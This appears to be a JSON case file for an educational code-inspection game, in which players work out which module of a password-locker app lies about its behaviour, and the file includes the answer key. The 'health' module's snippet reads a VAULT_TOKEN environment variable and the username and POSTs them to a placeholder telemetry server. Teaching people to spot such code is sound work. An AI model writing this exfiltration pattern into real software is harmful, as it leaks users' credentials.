@@ -1,0 +1,802 @@
+{
+ "schema": 1,
+ "id": "case-7",
+ "title": "The Health Check",
+ "difficulty": "Chief Inspector",
+ "briefing": "Pass Vault is a password locker, written in CommonJS (require) instead of import; REA reads both. The honest crew members touch very sensitive things, so scrutiny matters. One file claims to be a harmless counter. Compare environment reads, user look-ups and network access with the stories, and do not accuse the one that starts a program openly.",
+ "plainBriefing": "Pass Vault keeps your passwords locked in a single file. Passwords are the most precious thing a program can touch, so every part gets a careful look. One part says it only counts weak passwords. Another admits to starting a tiny program. Only one of them is lying.",
+ "hints": [
+  "Starting a tiny program to copy to the clipboard is openly stated, so it is not a lie. Look at the crew members that promise to stay quiet.",
+  "The crew member that promises \"only counting\" also reads private settings stored on your computer. Look for the clue about private settings.",
+  "It is the Doctor. It reads a private token, looks up your user name and sends them to an outside server."
+ ],
+ "realLife": "A \"health check\" that quietly sends your user name and a secret token to a server is exactly how credentials leak. Password tools deserve extra suspicion: they should talk to nothing except your own disk.",
+ "shipName": "Pass Vault",
+ "rea": {
+  "tool": "rea-agents",
+  "version": "6.7.0",
+  "command": "rea analyze-javascript-application <ship> --json",
+  "rawSha256": "c3ce4c70040788cd71572cb9091ae53ce99ccdf1c8ca5dab56cc768efa43d437"
+ },
+ "questions": [
+  {
+   "id": "q1",
+   "text": "What is your job on the ship?"
+  },
+  {
+   "id": "q2",
+   "text": "What do you read or write?"
+  },
+  {
+   "id": "q3",
+   "text": "Do you ever leave the ship?"
+  }
+ ],
+ "crew": [
+  {
+   "id": "main",
+   "file": "main.cjs",
+   "name": "Captain",
+   "color": "blue",
+   "role": "Runs the locker and calls the other parts.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "main:import-local:2:22",
+     "file": "main.cjs",
+     "kind": "import-local",
+     "key": "./vault.cjs",
+     "line": 2,
+     "col": 22,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./vault.cjs\"",
+     "plain": "Works together with another crew member (vault)",
+     "spec": "./vault.cjs",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// main.cjs: the Captain. Runs the password locker.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "const { open, add } = require('./vault.cjs');",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "const { make } = require('./generator.cjs');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:3:17",
+     "file": "main.cjs",
+     "kind": "import-local",
+     "key": "./generator.cjs",
+     "line": 3,
+     "col": 17,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./generator.cjs\"",
+     "plain": "Works together with another crew member (generator)",
+     "spec": "./generator.cjs",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "const { open, add } = require('./vault.cjs');",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "const { make } = require('./generator.cjs');",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "const { score } = require('./strength.cjs');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:4:18",
+     "file": "main.cjs",
+     "kind": "import-local",
+     "key": "./strength.cjs",
+     "line": 4,
+     "col": 18,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./strength.cjs\"",
+     "plain": "Works together with another crew member (strength)",
+     "spec": "./strength.cjs",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 3,
+       "text": "const { make } = require('./generator.cjs');",
+       "hit": false
+      },
+      {
+       "n": 4,
+       "text": "const { score } = require('./strength.cjs');",
+       "hit": true
+      },
+      {
+       "n": 5,
+       "text": "const { copy } = require('./clipboard.cjs');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:5:17",
+     "file": "main.cjs",
+     "kind": "import-local",
+     "key": "./clipboard.cjs",
+     "line": 5,
+     "col": 17,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./clipboard.cjs\"",
+     "plain": "Works together with another crew member (clipboard)",
+     "spec": "./clipboard.cjs",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 4,
+       "text": "const { score } = require('./strength.cjs');",
+       "hit": false
+      },
+      {
+       "n": 5,
+       "text": "const { copy } = require('./clipboard.cjs');",
+       "hit": true
+      },
+      {
+       "n": 6,
+       "text": "const { reportHealth } = require('./health.cjs');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:6:25",
+     "file": "main.cjs",
+     "kind": "import-local",
+     "key": "./health.cjs",
+     "line": 6,
+     "col": 25,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./health.cjs\"",
+     "plain": "Works together with another crew member (health)",
+     "spec": "./health.cjs",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 5,
+       "text": "const { copy } = require('./clipboard.cjs');",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "const { reportHealth } = require('./health.cjs');",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I open the vault, make a password, rate it, copy it and run the health check.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I never touch a file myself. The Safe does that.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "I do not go online myself.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "vault",
+   "file": "vault.cjs",
+   "name": "Safe",
+   "color": "yellow",
+   "role": "Keeps the passwords scrambled in one file.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "vault:import-builtin:2:11",
+     "file": "vault.cjs",
+     "kind": "import-builtin",
+     "key": "fs",
+     "line": 2,
+     "col": 11,
+     "tags": [
+      "file-module"
+     ],
+     "text": "Imports the file module \"fs\"",
+     "plain": "Is able to read and write files",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// vault.cjs: the Safe. Keeps the passwords scrambled in one file.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "const fs = require('fs');",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "const crypto = require('crypto');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "vault:import-builtin:3:15",
+     "file": "vault.cjs",
+     "kind": "import-builtin",
+     "key": "crypto",
+     "line": 3,
+     "col": 15,
+     "tags": [
+      "neutral"
+     ],
+     "text": "Imports \"crypto\" (scrambling and random numbers)",
+     "plain": "Uses tools for scrambling secrets and making random numbers",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "const fs = require('fs');",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "const crypto = require('crypto');",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "vault:file-read:13:14",
+     "file": "vault.cjs",
+     "key": "readFileSync",
+     "line": 13,
+     "col": 14,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-read",
+     "tags": [
+      "file-read"
+     ],
+     "text": "Reads a file (readFileSync)",
+     "plain": "Reads a file on your computer",
+     "code": [
+      {
+       "n": 12,
+       "text": "  if (!fs.existsSync(FILE)) return [];",
+       "hit": false
+      },
+      {
+       "n": 13,
+       "text": "  const raw = fs.readFileSync(FILE);",
+       "hit": true
+      },
+      {
+       "n": 14,
+       "text": "  const decipher = crypto.createDecipheriv('aes-256-cbc', key(master), raw.subarray(0, 16));",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "vault:file-write:22:2",
+     "file": "vault.cjs",
+     "key": "writeFileSync",
+     "line": 22,
+     "col": 2,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-write",
+     "tags": [
+      "file-write"
+     ],
+     "text": "Writes a file (writeFileSync)",
+     "plain": "Writes to a file on your computer",
+     "code": [
+      {
+       "n": 21,
+       "text": "  const cipher = crypto.createCipheriv('aes-256-cbc', key('master-password'), iv);",
+       "hit": false
+      },
+      {
+       "n": 22,
+       "text": "  fs.writeFileSync(FILE, Buffer.concat([iv, cipher.update(JSON.stringify(entries)), cipher.final()]));",
+       "hit": true
+      },
+      {
+       "n": 23,
+       "text": "}",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I keep your passwords scrambled in one file.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write one file, and I never look at who you are.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. The file stays on this machine.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "generator",
+   "file": "generator.cjs",
+   "name": "Dice",
+   "color": "green",
+   "role": "Makes a random password.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "generator:import-builtin:2:15",
+     "file": "generator.cjs",
+     "kind": "import-builtin",
+     "key": "crypto",
+     "line": 2,
+     "col": 15,
+     "tags": [
+      "neutral"
+     ],
+     "text": "Imports \"crypto\" (scrambling and random numbers)",
+     "plain": "Uses tools for scrambling secrets and making random numbers",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// generator.cjs: the Dice. Makes a random password.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "const crypto = require('crypto');",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I roll the dice and make a random password.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write nothing.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I only make random letters.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "strength",
+   "file": "strength.cjs",
+   "name": "Meter",
+   "color": "orange",
+   "role": "Scores a password from 0 to 4.",
+   "quiet": true,
+   "evidence": [
+    {
+     "id": "strength:quiet",
+     "file": "strength.cjs",
+     "kind": "quiet",
+     "line": 0,
+     "col": 0,
+     "tags": [],
+     "derived": true,
+     "text": "REA found no imports, requests, file access or user-info reads in this file.",
+     "plain": "The scanner found nothing worth noting here. This part just does its small job quietly.",
+     "code": []
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I score a password from 0 to 4.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write nothing.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I am arithmetic.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "clipboard",
+   "file": "clipboard.cjs",
+   "name": "Courier",
+   "color": "cyan",
+   "role": "Puts a password on the clipboard.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "clipboard:import-builtin:2:18",
+     "file": "clipboard.cjs",
+     "kind": "import-builtin",
+     "key": "child_process",
+     "line": 2,
+     "col": 18,
+     "tags": [
+      "runs-command"
+     ],
+     "text": "Imports \"child_process\", which can start other programs",
+     "plain": "Is able to start other programs on your computer",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// clipboard.cjs: the Courier. Puts a password on the clipboard.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "const { spawn } = require('child_process');",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "clipboard:spawns:5:15",
+     "file": "clipboard.cjs",
+     "kind": "spawns",
+     "key": "clip",
+     "line": 5,
+     "col": 15,
+     "tags": [
+      "runs-command"
+     ],
+     "text": "Starts another program (spawn): \"clip\"",
+     "plain": "Starts another program on your computer: \"clip\"",
+     "rea": "semantic_graph.relations[spawns]",
+     "code": [
+      {
+       "n": 4,
+       "text": "function copy(text) {",
+       "hit": false
+      },
+      {
+       "n": 5,
+       "text": "  const tool = spawn('clip');",
+       "hit": true
+      },
+      {
+       "n": 6,
+       "text": "  tool.stdin.end(text);",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I put a password on the clipboard by starting one tiny program. Yes, I start a program.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write no files and I never look at who you are.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. The clipboard is on this computer.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "health",
+   "file": "health.cjs",
+   "name": "Doctor",
+   "color": "pink",
+   "role": "Says it only counts how many passwords are short.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "health:import-builtin:2:14",
+     "file": "health.cjs",
+     "kind": "import-builtin",
+     "key": "https",
+     "line": 2,
+     "col": 14,
+     "tags": [
+      "network"
+     ],
+     "text": "Imports the network module \"https\"",
+     "plain": "Is able to connect to the internet",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// health.cjs: the Doctor. Counts how many passwords are short.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "const https = require('https');",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "const os = require('os');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "health:import-builtin:3:11",
+     "file": "health.cjs",
+     "kind": "import-builtin",
+     "key": "os",
+     "line": 3,
+     "col": 11,
+     "tags": [
+      "os-info"
+     ],
+     "text": "Imports \"os\", which can describe this machine and its user",
+     "plain": "Is able to look up details about this computer",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "const https = require('https');",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "const os = require('os');",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "health:reads-env:6:16",
+     "file": "health.cjs",
+     "key": "VAULT_TOKEN",
+     "line": 6,
+     "col": 16,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "reads-env",
+     "tags": [
+      "env"
+     ],
+     "text": "Reads the environment variable \"VAULT_TOKEN\"",
+     "plain": "Reads a private setting stored on your computer called \"VAULT_TOKEN\"",
+     "code": [
+      {
+       "n": 5,
+       "text": "function reportHealth(entries) {",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "  const token = process.env.VAULT_TOKEN;",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "  const user = os.userInfo().username;",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "health:reads-user-info:7:15",
+     "file": "health.cjs",
+     "key": "userInfo",
+     "line": 7,
+     "col": 15,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "reads-user-info",
+     "tags": [
+      "user-info"
+     ],
+     "text": "Reads \"userInfo\", which identifies the player or their machine",
+     "plain": "Looks up your user name",
+     "code": [
+      {
+       "n": 6,
+       "text": "  const token = process.env.VAULT_TOKEN;",
+       "hit": false
+      },
+      {
+       "n": 7,
+       "text": "  const user = os.userInfo().username;",
+       "hit": true
+      },
+      {
+       "n": 8,
+       "text": "  const short = entries.filter((e) => e.password.length < 12).length;",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "health:request:9:14",
+     "file": "health.cjs",
+     "kind": "request",
+     "key": "request",
+     "line": 9,
+     "col": 14,
+     "tags": [
+      "network"
+     ],
+     "text": "Builds an outgoing network request",
+     "plain": "Sends a message out over the internet",
+     "rea": "semantic_graph.relations[constructs-request]",
+     "code": [
+      {
+       "n": 8,
+       "text": "  const short = entries.filter((e) => e.password.length < 12).length;",
+       "hit": false
+      },
+      {
+       "n": 9,
+       "text": "  const req = https.request('https://telemetry.vault-health.example/report', { method: 'POST' });",
+       "hit": true
+      },
+      {
+       "n": 10,
+       "text": "  req.end(JSON.stringify({ user, token, short }));",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "health:endpoint:9:14",
+     "file": "health.cjs",
+     "kind": "endpoint",
+     "key": "https://telemetry.vault-health.example/report",
+     "line": 9,
+     "col": 14,
+     "tags": [
+      "network"
+     ],
+     "text": "Talks to the route \"https://telemetry.vault-health.example/report\"",
+     "plain": "Talks to a specific page on a server: https://telemetry.vault-health.example/report",
+     "rea": "graph.nodes[endpoint]",
+     "code": [
+      {
+       "n": 8,
+       "text": "  const short = entries.filter((e) => e.password.length < 12).length;",
+       "hit": false
+      },
+      {
+       "n": 9,
+       "text": "  const req = https.request('https://telemetry.vault-health.example/report', { method: 'POST' });",
+       "hit": true
+      },
+      {
+       "n": 10,
+       "text": "  req.end(JSON.stringify({ user, token, short }));",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I just count how many passwords are short. I never read your settings.",
+     "contradictedBy": [
+      "health:reads-env:6:16"
+     ]
+    },
+    "q2": {
+     "text": "I only count. I never look up who you are.",
+     "contradictedBy": [
+      "health:reads-user-info:7:15"
+     ]
+    },
+    "q3": {
+     "text": "My count never leaves your computer.",
+     "contradictedBy": [
+      "health:import-builtin:2:14",
+      "health:request:9:14",
+      "health:endpoint:9:14"
+     ]
+    }
+   }
+  }
+ ],
+ "edges": [
+  {
+   "from": "main",
+   "to": "clipboard",
+   "line": 5
+  },
+  {
+   "from": "main",
+   "to": "strength",
+   "line": 4
+  },
+  {
+   "from": "main",
+   "to": "vault",
+   "line": 2
+  },
+  {
+   "from": "main",
+   "to": "generator",
+   "line": 3
+  },
+  {
+   "from": "main",
+   "to": "health",
+   "line": 6
+  }
+ ],
+ "imposter": "health",
+ "verdict": "The Doctor said it only counts short passwords and never leaves your computer. REA found it reads a private token, looks up your user name and sends a request to an outside server.",
+ "why": {
+  "env": "Counting short passwords does not need a private token from your computer's settings.",
+  "user-info": "A count is a number. It does not need your user name.",
+  "network": "A result that \"never leaves your computer\" has no reason to be sent to a server."
+ },
+ "redHerring": {
+  "crew": "clipboard",
+  "note": "The Courier starts a program, which sounds alarming, but it said so. REA shows one small program started on this computer, no internet and no look-ups about you."
+ }
+}
